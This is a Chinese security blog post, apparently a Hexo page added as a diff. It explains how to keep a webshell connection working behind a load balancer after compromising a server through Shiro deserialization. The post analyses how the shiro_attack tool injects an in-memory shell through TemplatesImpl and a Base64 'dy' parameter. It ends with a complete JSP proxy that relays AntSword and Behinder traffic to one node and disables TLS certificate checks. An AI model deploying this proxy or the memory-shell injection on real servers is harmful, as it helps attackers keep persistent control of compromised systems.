@@ -1,0 +1,204 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>负载均衡踩坑记 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="负载均衡踩坑记"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>负载均衡踩坑记</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/09/24/负载均衡踩坑记/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-09-24T02:55:46.000Z">
+          2021-09-24
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​    事情是这样的，最近有个渗透的小伙伴找我，它通过shiro反序列化植入内存马获取了一个shell，但这台主机上有负载均衡，所以通过冰蝎、蚁剑等连接工具上传大文件会上传失败，需要我这边提供解决方案。</p>
+<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><h3 id="问题一：为什么shell管理工具文件上传需要分包？"><a href="#问题一：为什么shell管理工具文件上传需要分包？" class="headerlink" title="问题一：为什么shell管理工具文件上传需要分包？"></a>问题一：为什么shell管理工具文件上传需要分包？</h3><p>​    我使用蚁剑做了测试，蚁剑配置shell可以在<code>其他设置</code>中设置分片的大小，默认是<code>500kb</code>，那有小伙伴可能要说了，那我将这个值改成一个比较大的值不就可以一次性上传大文件也就相当于解决了负载均衡的问题。</p>
+<span id="more"></span>
+
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924111448792.png" alt="image-20210924111448792"></p>
+<p>​    理论上是没错的，我们改分包的大小为<code>5000kb</code>试试，提示<strong>上传失败！</strong></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924111602702.png" alt="image-20210924111602702"></p>
+<p>​    抓包可以看到确实发起了上传请求但是并<strong>没有获取到返回结果</strong>，并且我们可以看到上传的内容都是在<code>z2</code>参数中，那么<strong>会不会是请求参数有大小限制导致的？</strong></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924111529941.png" alt="image-20210924111529941"></p>
+<p>​    经过查阅资料，<strong>Tomcat默认参数大小为2M</strong>，所以才需要对上传操作分包上传。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924112151502.png" alt="image-20210924112151502"></p>
+<h3 id="问题二：是否有其他方式上传大文件？"><a href="#问题二：是否有其他方式上传大文件？" class="headerlink" title="问题二：是否有其他方式上传大文件？"></a>问题二：是否有其他方式上传大文件？</h3><p>​    虽然webshell管理工具没有提供一次上传大文件的方式，但实际上我们也<strong>可以自己构造一个上传点通过解析上传表单的内容实现一次性上传大文件的需求</strong>。虽然这种方案也算比较可行，可以解决目前的需求，但是并没有从本质上解决负载均衡下的webshell连接问题。</p>
+<h3 id="问题三：有什么方法可以解决负载均衡下的webshell连接问题？"><a href="#问题三：有什么方法可以解决负载均衡下的webshell连接问题？" class="headerlink" title="问题三：有什么方法可以解决负载均衡下的webshell连接问题？"></a>问题三：有什么方法可以解决负载均衡下的webshell连接问题？</h3><p>​    其实在很早以前<code>Medicean</code>表哥就分析过这个问题，可以参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA">负载均衡下的 WebShell 连接</a>。</p>
+<p>​    在这片文章中他提出了一个比较稳妥的解决方案，即<strong>实现HTTP代理，将所有对webshell的连接请求都代理到指定的一台节点上处理，我们只需要和代理交互即可</strong>。</p>
+<p>​    虽然<code>Medicean</code>表哥提出了解决方案，不过并没有给出具体的实现代码，所以我们只能自己去写，不过这个逻辑本身也比较简单，<strong>请求代理url时构建一个新的url请求并发送到指定节点，最后获取返回结果并返回给客户端</strong>。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>​    这里我开了两台web进行模拟。</p>
+<ul>
+<li>tomcat <strong>模拟负载均衡</strong>的主机，这台主机上有一个webshell（<code>http://192.168.3.1:8088/test666.jsp</code>）。</li>
+<li>使用springboot启动的web <strong>模拟代理</strong>的功能（主要是为了方便调试），需要将所有对webshell的请求转发到tomcat中处理并获取返回结果(<code>http://192.168.3.1:8089</code>)。</li>
+</ul>
+<h2 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h2><p>​    首先是URL请求的问题，由于我们并不知道对方主机上是否有其他的第三方库处理HTTP请求，所以选择使用JDK自带的<code>HttpsURLConnection</code>来处理URL请求。可以分为下面几个步骤实现代理功能。</p>
+<h3 id="步骤一：接收请求内容并发给目标"><a href="#步骤一：接收请求内容并发给目标" class="headerlink" title="步骤一：接收请求内容并发给目标"></a>步骤一：接收请求内容并发给目标</h3><p>​    在获取请求内容时，我们的代理并不关注目标发送了什么数据，所以我这里决定使用<code>request.getInputStream</code>获取请求内容。但是这里有个小坑点，由于我是使用springboot来模拟<code>proxy</code>的，但<strong>springboot在到达我们的proxy Controller之前会读取InputStream中的内容，所以在proxy Controller中去读<code>request.getInputStream</code>是获取不到内容的</strong>。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924121239642.png" alt="image-20210924121239642"></p>
+<p>​    由于渗透小伙伴给的目标本身不解析JSP，我最终一定是要打一个内存马给他的，所以我这干脆找了个<a target="_blank" rel="noopener" href="https://github.com/bitterzzZZ/MemoryShellLearn/blob/main/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-servlet-filter-listener/AddFilter.java">Filter的内存马</a>，在<code>doFilter</code>中添加我们代理的逻辑。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924121830705.png" alt="image-20210924121830705"></p>
+<h3 id="步骤二：获取目标返回结果并返回给客户端"><a href="#步骤二：获取目标返回结果并返回给客户端" class="headerlink" title="步骤二：获取目标返回结果并返回给客户端"></a>步骤二：获取目标返回结果并返回给客户端</h3><p>​        在获取返回包时，还有一个小坑，蚁剑的返回包是字符，所以我们直接用字符流获取返回内容并输出是没问题的，但是冰蝎的返回包却是字节码，用字符流处理会有问题，因此最终还是用<code>OutputStream</code>获取响应。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924134436463.png" alt="image-20210924134436463"></p>
+<h3 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h3><p>​    下面是<strong>蚁剑</strong>的测试，<code>proxy2</code>是我注入的内存马的URL：</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924135009915.png" alt="image-20210924135009915"></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924135425629.png" alt="image-20210924135425629"></p>
+<p><strong>冰蝎演示</strong></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924140513691-16324635138441.png" alt="image-20210924140513691"></p>
+<h3 id="内存马种植问题"><a href="#内存马种植问题" class="headerlink" title="内存马种植问题"></a>内存马种植问题</h3><p>​    在本地调试通过后因为要把代理打到内存中，所以我在本地搭建了shiro测试。但是当我通过shiro植入内存马却爆了请求头过长的问题。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924141225088.png" alt="image-20210924141225088"></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924141459811.png" alt="image-20210924141459811"></p>
+<p>​    但我用<a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">GITHUB</a>上这款工具注入内存马却没有问题，抓包分析下它的内存马种植除了有remeberMe字段，还POST一个dy参数。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924141838161.png" alt="image-20210924141838161"></p>
+<p>​    那我们分析下这款工具是如何注入内存马的。</p>
+<p>​    当我们执行内存马植入操作，主要会交给<code>attack.core.AttackService#injectMem</code>处理请求。<code>GadgetPayload</code>生成加密后的Remeberme的值，将这个值设置到Cookie中，并且植入内存马的密码和路径都会被设置到请求头中。接下来通过<code>MemBytes.getBytes</code>获取要注入的内存马的类的Base64后的字节码并设置到dy字段中。所以在<code>dy</code>参数中保存的才是真正的内存马。<code>Cookie</code>中保存的只是加载内存马的Loader。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924143925125.png" alt="image-20210924143925125"></p>
+<p>​    分析过CC的同学一定知道，<code>TemplatesImpl</code>中最终会将<code>_bytecodes</code>中的类实例化，所以到服务端会执行<code>InjectMemTool</code>的构造方法。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145443578.png" alt="image-20210924145443578"></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145511067.png" alt="image-20210924145511067"></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145652571.png" alt="image-20210924145652571"></p>
+<p>​    <code>InjectMemTool</code>构造方法中通过反射获取<code>request</code>对象的<code>dy</code>参数，Base64解码后通过defineClass加载类，最终实例化后调用<code>equal</code>方法。这里作者还是下了一些功夫的，为了压缩这个类的体积，将反射获取字段内容抽出来构造了<code>getFV</code>方法。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145956729.png" alt="image-20210924145956729"></p>
+<p>​    在作者提供的内存马中，<code>equals</code>方法会去通过<code>addFilter</code>或者<code>addServlet</code>添加内存马。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924150313488.png" alt="image-20210924150313488"></p>
+<p>​    虽然了解了原理，但是自己手改这样的代码其实还是比较复杂的，所以我决定将作者提供的内存马的实现类的<code>doFilter</code>方法改成我们的代理类的内容，所以要分析<code>MemBytes.getBytes</code>的逻辑。<code>getBytes</code>根据传入的类型找到<code>classname</code>，再根据<code>classname</code>从<code>MEM_TOOLS</code>中找到实现类的字节码。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924162342542.png" alt="image-20210924162342542"></p>
+<p>​    这个字节码在初始化时就会被放入Map中，所以理论上来讲，只要我们在Map里添加代理和实现类的Base64编码就可以扩展这个功能了。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924162537239.png" alt="image-20210924162537239"></p>
+<p>​        理论上是这样没错，可是我将Proxy添加到map中，编译后覆盖掉原有的类后发现我的<code>ProxyFilter</code>并没有在界面上显示。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924173104339.png" alt="image-20210924173104339"></p>
+<p>​    分析源码后发现这些值是写死的，所以不能通过这种方式扩展，只能通过将原有的<code>Filter</code>覆盖为我们的Proxy的方式来实现。可惜作者没有在GITHUB开源，而开不太方便。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924173231587.png" alt="image-20210924173231587"></p>
+<h3 id="SSL问题"><a href="#SSL问题" class="headerlink" title="SSL问题"></a>SSL问题</h3><p>​    本以为到这里就结束了，但目标是开启了SSL的tomcat,而这个SSL可能是使用的自签名，所以直接去请求会报错，我本地也给tomcat开启了SSL进行访问测试，发现会爆一个SSL的异常，所以这里我们还要加上一个判断，忽略SSL的验证。</p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924173914351.png" alt="image-20210924173914351"></p>
+<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924174036647.png" alt="image-20210924174036647"></p>
+<h3 id="完整实现"><a href="#完整实现" class="headerlink" title="完整实现"></a>完整实现</h3><p>​    最后给出完整实现的JSP版本。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.net.ssl.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.DataInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.OutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.HttpURLConnection&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.KeyManagementException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.NoSuchAlgorithmException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.cert.CertificateException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.cert.X509Certificate&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ignoreSsl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HostnameVerifier hv = <span class="keyword">new</span> HostnameVerifier() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String urlHostName, SSLSession session)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        trustAllHttpsCertificates();</span><br><span class="line">        HttpsURLConnection.setDefaultHostnameVerifier(hv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trustAllHttpsCertificates</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TrustManager[] trustAllCerts = <span class="keyword">new</span> TrustManager[] &#123; <span class="keyword">new</span> X509TrustManager() &#123;</span><br><span class="line">            <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkClientTrusted</span><span class="params">(X509Certificate[] arg0, String arg1)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line">                <span class="comment">// Not implemented</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkServerTrusted</span><span class="params">(X509Certificate[] arg0, String arg1)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line">                <span class="comment">// Not implemented</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SSLContext sc = SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sc.init(<span class="keyword">null</span>, trustAllCerts, <span class="keyword">new</span> java.security.SecureRandom());</span><br><span class="line"></span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeyManagementException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        String target = <span class="string">&quot;https://127.0.0.1:8443/test666.jsp&quot;</span>;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(target);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;https&quot;</span>.equalsIgnoreCase(url.getProtocol())) &#123;</span><br><span class="line">            ignoreSsl();</span><br><span class="line">        &#125;</span><br><span class="line">        HttpURLConnection conn = (HttpURLConnection)url.openConnection();</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        conn.setRequestMethod(request.getMethod());</span><br><span class="line">        conn.setConnectTimeout(<span class="number">30000</span>);</span><br><span class="line">        conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">        conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">        conn.setInstanceFollowRedirects(<span class="keyword">false</span>);</span><br><span class="line">        conn.connect();</span><br><span class="line">        ByteArrayOutputStream baos=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        OutputStream out2 = conn.getOutputStream();</span><br><span class="line">        DataInputStream in=<span class="keyword">new</span> DataInputStream(request.getInputStream());</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        baos.flush();</span><br><span class="line">        baos.writeTo(out2);</span><br><span class="line">        baos.close();</span><br><span class="line">        InputStream inputStream = conn.getInputStream();</span><br><span class="line">        OutputStream out3=response.getOutputStream();</span><br><span class="line">        <span class="keyword">int</span> len2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len2 = inputStream.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            out3.write(buf, <span class="number">0</span>, len2);</span><br><span class="line">        &#125;</span><br><span class="line">        out3.flush();</span><br><span class="line">        out3.close();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA">负载均衡下的 WebShell 连接</a></li>
+</ul>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/安全研究/">安全研究</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
